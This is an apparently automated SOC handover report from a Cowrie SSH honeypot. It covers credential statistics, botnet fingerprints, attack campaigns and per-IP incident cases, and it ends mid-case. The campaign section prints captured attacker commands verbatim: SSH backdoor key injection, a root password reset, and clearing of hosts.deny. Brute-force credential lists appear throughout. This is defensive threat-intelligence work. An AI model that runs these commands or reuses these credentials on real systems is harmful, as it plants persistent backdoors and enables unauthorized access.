# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-10 |
| **Generated At** | 2026-08-10T19:03:58Z |
| **Shift Time** | 19:03 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **186** |
| Confirmed Threats | **159** |
| False Positives Filtered | **27** (14.5%) |
| Unique Attacker IPs | **79** |
| Countries of Origin | **24** |
| High Severity Cases | **55** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **131** |
| Malware Samples Analyzed | **2** HIGH · **24** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **68** |
| Unique Credential Pairs | **36** |
| Unique Usernames | **11** |
| Unique Passwords | **33** |
| Successful Auth Pairs | **59** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 30 |
| `support` | 13 |
| `centos` | 5 |
| `config` | 4 |
| `test` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123qwe` | 6 |
| `smo@@kkklss` | 4 |
| `support` | 4 |
| `qwerty` | 4 |
| `123abc` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `123qwe` | 5 |
| `root` | `smo@@kkklss` | 4 |
| `support` | `support` | 4 |
| `centos` | `qwerty` | 4 |
| `config` | `123123123` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-10T16:55:21 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-10T16:55:21 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-10T16:55:30 |
| `support` | `webmaster` | `58.245.210.70` | 2026-08-10T16:57:19 |
| `root` | `﻿------fuck------` | `43.100.57.229` | 2026-08-10T17:04:15 |
| `centos` | `asdfgh` | `35.130.111.146` | 2026-08-10T17:06:29 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-10T17:08:13 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-10T17:08:13 |
| `test` | `toor` | `203.192.211.180` | 2026-08-10T17:11:30 |
| `test` | `toor` | `211.169.212.206` | 2026-08-10T17:11:44 |
| `support` | `z1x2c3v4` | `220.178.39.106` | 2026-08-10T17:15:22 |
| `support` | `z1x2c3v4` | `27.223.98.117` | 2026-08-10T17:15:30 |
| `support` | `support` | `176.53.159.196` | 2026-08-10T17:15:35 |
| `Admin` | `password` | `10.0.0.73` | 2026-08-10T17:17:10 |
| `test` | `toor` | `10.0.0.73` | 2026-08-10T17:23:12 |
| `support` | `z1x2c3v4` | `186.215.107.189` | 2026-08-10T17:31:42 |
| `support` | `support` | `10.0.0.73` | 2026-08-10T17:39:20 |
| `centos` | `qwerty` | `116.72.9.151` | 2026-08-10T17:45:51 |
| `centos` | `qwerty` | `66.45.144.201` | 2026-08-10T17:46:03 |
| `root` | `Cq123456` | `101.126.157.138` | 2026-08-10T17:47:28 |
| `ubnt` | `123abc` | `10.0.0.73` | 2026-08-10T17:51:24 |
| `centos` | `qwerty` | `10.0.0.73` | 2026-08-10T17:57:30 |
| `root` | `LeitboGi0ro` | `140.245.50.204` | 2026-08-10T18:05:19 |
| `root` | `123@@@` | `140.245.50.204` | 2026-08-10T18:05:19 |
| `root` | `smo@@kkklss` | `140.245.50.204` | 2026-08-10T18:05:25 |
| `ubnt` | `123abc` | `14.194.128.158` | 2026-08-10T18:09:58 |
| `ubnt` | `123abc` | `180.71.9.31` | 2026-08-10T18:10:11 |
| `root` | `ubuntu` | `60.249.245.163` | 2026-08-10T18:12:17 |
| `centos` | `qwerty` | `200.37.179.83` | 2026-08-10T18:14:40 |
| `root` | `111111` | `193.32.162.84` | 2026-08-10T18:15:18 |
| `root` | `123` | `193.32.162.84` | 2026-08-10T18:18:07 |
| `nobody` | `123654` | `10.0.0.73` | 2026-08-10T18:19:23 |
| `config` | `123123123` | `179.189.85.66` | 2026-08-10T18:19:48 |
| `config` | `123123123` | `101.13.5.50` | 2026-08-10T18:20:01 |
| `root` | `123123` | `193.32.162.84` | 2026-08-10T18:20:51 |
| `root` | `123321` | `193.32.162.84` | 2026-08-10T18:23:46 |
| `alexandra` | `123` | `149.28.138.88` | 2026-08-10T18:24:47 |
| `support` | `123qwe` | `10.0.0.73` | 2026-08-10T18:25:28 |
| `root` | `1234` | `193.32.162.84` | 2026-08-10T18:26:32 |
| `root` | `12345` | `193.32.162.84` | 2026-08-10T18:29:15 |
| `config` | `123123123` | `10.0.0.73` | 2026-08-10T18:31:25 |
| `root` | `1234567` | `193.32.162.84` | 2026-08-10T18:34:10 |
| `root` | `12345678` | `193.32.162.84` | 2026-08-10T18:36:37 |
| `nobody` | `123654` | `211.43.139.142` | 2026-08-10T18:37:35 |
| `root` | `123456789` | `193.32.162.84` | 2026-08-10T18:38:59 |
| `root` | `1234abcd` | `193.32.162.84` | 2026-08-10T18:41:21 |
| `root` | `123abc` | `193.32.162.84` | 2026-08-10T18:43:47 |
| `support` | `123qwe` | `124.152.90.68` | 2026-08-10T18:43:56 |
| `support` | `123qwe` | `178.178.194.131` | 2026-08-10T18:44:08 |
| `support` | `123qwe` | `187.115.144.103` | 2026-08-10T18:44:11 |
| `support` | `123qwe` | `119.160.166.237` | 2026-08-10T18:44:20 |
| `root` | `123qwe` | `193.32.162.84` | 2026-08-10T18:46:09 |
| `root` | `1q2w3e` | `193.32.162.84` | 2026-08-10T18:48:27 |
| `root` | `1q2w3e4r` | `193.32.162.84` | 2026-08-10T18:50:46 |
| `root` | `1qaz2wsx` | `193.32.162.84` | 2026-08-10T18:52:58 |
| `user` | `Password` | `10.0.0.73` | 2026-08-10T18:53:57 |
| `operator` | `default` | `34.146.217.105` | 2026-08-10T18:54:04 |
| `operator` | `default` | `210.0.90.82` | 2026-08-10T18:54:18 |
| `root` | `111111` | `2.57.122.168` | 2026-08-10T18:54:46 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **186** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 27 |
| OpenSSH | 24 |
| Paramiko (Python) | 10 |
| libssh | 8 |
| Perl Net::SSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 24 | 24 |
| `2ec37a7cc8da...` | Mirai/variant | 17 | 2 |
| `a2de0f306611...` | Mirai/variant | 10 | 3 |
| `e54ef3ec27fe...` | Generic scanner | 3 | 3 |
| `c37911009092...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 24 | 24 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 17 | 2 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 10 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `e54ef3ec27fe...` | Go SSH scanner | 3 | 3 | Generic scanner |
| `c37911009092...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 16 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1140, T1105` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:3Ek0E3kgrsa5"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.157.138`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.84`, `2.57.122.168`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
mkdir -p /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCYteFBiVVKhUucH8Jjuzlh9pNriiQJFagSbuI1FN5czogKvtyc/ayDvt2T7w5UMuo1kIYefBQRKc661934f6dd2a58NAIs7ehhoG56IVFPUdooUza00ziduX/8vgd29UmSZk8Y+7bAh0cP43C3N0/M6RlV8Qy2onqrF02RbeTu9tzhuBBJA//7ZHzoL/0dbGhwrGOrxSmqPnNO4VL/W8gOHYyDRSLPfUpTJNsP9AulmmQeaYXcQOZ4pFzMpiGZwSXJYw9xcrz7PMmMAcCOYbAWJYz9LT980nY3XgQb9QSKDoGuRlqm5HPdY2bipGgFwgwNGG0V4bQLCUMKudkq6oWL rsa-key-20250409' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/author
```
Source IPs: `149.28.138.88`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **79** |
| Unique ASNs | **50** |
| High-Risk ASNs | **40** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 6 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS20473` | The Constant Company, LLC | 2 | HIGH |
| `AS47890` | UNMANAGED LTD | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (54)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-db0c68d892b7

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 16:55 |
| **Last Seen** | 2026-08-10 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:55:21` | `cowrie.session.connect` |
| `2026-08-10 16:55:21` | `cowrie.client.version` |
| `2026-08-10 16:55:21` | `cowrie.client.kex` |
| `2026-08-10 16:55:21` | `cowrie.login.success` |
| `2026-08-10 16:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3af591d5c43

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 16:55 |
| **Last Seen** | 2026-08-10 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:55:21` | `cowrie.session.connect` |
| `2026-08-10 16:55:21` | `cowrie.client.version` |
| `2026-08-10 16:55:21` | `cowrie.client.kex` |
| `2026-08-10 16:55:21` | `cowrie.login.success` |
| `2026-08-10 16:55:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e9e6975b76

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 16:55 |
| **Last Seen** | 2026-08-10 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:55:30` | `cowrie.session.connect` |
| `2026-08-10 16:55:30` | `cowrie.client.version` |
| `2026-08-10 16:55:30` | `cowrie.client.kex` |
| `2026-08-10 16:55:30` | `cowrie.login.success` |
| `2026-08-10 16:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10951a14cb34

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-10 16:55 |
| **Last Seen** | 2026-08-10 16:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:55:30` | `cowrie.session.connect` |
| `2026-08-10 16:55:30` | `cowrie.client.version` |
| `2026-08-10 16:55:30` | `cowrie.client.kex` |
| `2026-08-10 16:55:30` | `cowrie.login.success` |
| `2026-08-10 16:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1784c4e3145

| Field | Detail |
|---|---|
| **Source IP** | `58.245.210[.]70` |
| **First Seen** | 2026-08-10 16:57 |
| **Last Seen** | 2026-08-10 16:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 16:57:17` | `cowrie.session.connect` |
| `2026-08-10 16:57:17` | `cowrie.client.version` |
| `2026-08-10 16:57:17` | `cowrie.client.kex` |
| `2026-08-10 16:57:19` | `cowrie.login.success` |
| `2026-08-10 16:57:20` | `cowrie.direct-tcpip.request` |
| `2026-08-10 16:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.245.210[.]70` to AbuseIPDB if not already reported
- [ ] Block `58.245.210[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6cec9ed7aad

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-08-10 17:06 |
| **Last Seen** | 2026-08-10 17:11 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:06:28` | `cowrie.session.connect` |
| `2026-08-10 17:06:28` | `cowrie.client.version` |
| `2026-08-10 17:06:28` | `cowrie.client.kex` |
| `2026-08-10 17:06:29` | `cowrie.login.success` |
| `2026-08-10 17:06:30` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:11:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d46d89a07f6a

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-10 17:08 |
| **Last Seen** | 2026-08-10 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:08:12` | `cowrie.session.connect` |
| `2026-08-10 17:08:12` | `cowrie.client.version` |
| `2026-08-10 17:08:12` | `cowrie.client.kex` |
| `2026-08-10 17:08:13` | `cowrie.login.success` |
| `2026-08-10 17:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7f4a5bdeaa

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-08-10 17:08 |
| **Last Seen** | 2026-08-10 17:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:08:12` | `cowrie.session.connect` |
| `2026-08-10 17:08:12` | `cowrie.client.version` |
| `2026-08-10 17:08:12` | `cowrie.client.kex` |
| `2026-08-10 17:08:13` | `cowrie.login.success` |
| `2026-08-10 17:08:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9f23e8aaca

| Field | Detail |
|---|---|
| **Source IP** | `203.192.211[.]180` |
| **First Seen** | 2026-08-10 17:11 |
| **Last Seen** | 2026-08-10 17:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:11:28` | `cowrie.session.connect` |
| `2026-08-10 17:11:29` | `cowrie.client.version` |
| `2026-08-10 17:11:29` | `cowrie.client.kex` |
| `2026-08-10 17:11:30` | `cowrie.login.success` |
| `2026-08-10 17:11:31` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.192.211[.]180` to AbuseIPDB if not already reported
- [ ] Block `203.192.211[.]180` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c2bf7e181f3

| Field | Detail |
|---|---|
| **Source IP** | `211.169.212[.]206` |
| **First Seen** | 2026-08-10 17:11 |
| **Last Seen** | 2026-08-10 17:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:11:41` | `cowrie.session.connect` |
| `2026-08-10 17:11:41` | `cowrie.client.version` |
| `2026-08-10 17:11:41` | `cowrie.client.kex` |
| `2026-08-10 17:11:44` | `cowrie.login.success` |
| `2026-08-10 17:11:44` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:11:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.169.212[.]206` to AbuseIPDB if not already reported
- [ ] Block `211.169.212[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d6553d5251b

| Field | Detail |
|---|---|
| **Source IP** | `220.178.39[.]106` |
| **First Seen** | 2026-08-10 17:15 |
| **Last Seen** | 2026-08-10 17:15 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:15:18` | `cowrie.session.connect` |
| `2026-08-10 17:15:20` | `cowrie.client.version` |
| `2026-08-10 17:15:20` | `cowrie.client.kex` |
| `2026-08-10 17:15:22` | `cowrie.login.success` |
| `2026-08-10 17:15:23` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.178.39[.]106` to AbuseIPDB if not already reported
- [ ] Block `220.178.39[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ff94965415c

| Field | Detail |
|---|---|
| **Source IP** | `27.223.98[.]117` |
| **First Seen** | 2026-08-10 17:15 |
| **Last Seen** | 2026-08-10 17:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:15:28` | `cowrie.session.connect` |
| `2026-08-10 17:15:29` | `cowrie.client.version` |
| `2026-08-10 17:15:29` | `cowrie.client.kex` |
| `2026-08-10 17:15:30` | `cowrie.login.success` |
| `2026-08-10 17:15:31` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.223.98[.]117` to AbuseIPDB if not already reported
- [ ] Block `27.223.98[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-381164cb40d5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-10 17:15 |
| **Last Seen** | 2026-08-10 17:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:15:35` | `cowrie.session.connect` |
| `2026-08-10 17:15:35` | `cowrie.client.version` |
| `2026-08-10 17:15:35` | `cowrie.client.kex` |
| `2026-08-10 17:15:35` | `cowrie.login.success` |
| `2026-08-10 17:15:35` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:15:35` | `cowrie.direct-tcpip.data` |
| `2026-08-10 17:15:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a68e2bc659

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-10 17:31 |
| **Last Seen** | 2026-08-10 17:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:31:40` | `cowrie.session.connect` |
| `2026-08-10 17:31:40` | `cowrie.client.version` |
| `2026-08-10 17:31:40` | `cowrie.client.kex` |
| `2026-08-10 17:31:42` | `cowrie.login.success` |
| `2026-08-10 17:31:42` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbfc3803d592

| Field | Detail |
|---|---|
| **Source IP** | `116.72.9[.]151` |
| **First Seen** | 2026-08-10 17:45 |
| **Last Seen** | 2026-08-10 17:45 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:45:46` | `cowrie.session.connect` |
| `2026-08-10 17:45:48` | `cowrie.client.version` |
| `2026-08-10 17:45:48` | `cowrie.client.kex` |
| `2026-08-10 17:45:51` | `cowrie.login.success` |
| `2026-08-10 17:45:52` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:45:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.72.9[.]151` to AbuseIPDB if not already reported
- [ ] Block `116.72.9[.]151` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794942d850c0

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-08-10 17:46 |
| **Last Seen** | 2026-08-10 17:46 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-10 17:46:01` | `cowrie.session.connect` |
| `2026-08-10 17:46:02` | `cowrie.client.version` |
| `2026-08-10 17:46:02` | `cowrie.client.kex` |
| `2026-08-10 17:46:03` | `cowrie.login.success` |
| `2026-08-10 17:46:03` | `cowrie.direct-tcpip.request` |
| `2026-08-10 17:46:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eedcec60786f

| Field | Detail |
|---|---|
| **Source IP** | `101.126.157[.]138` |
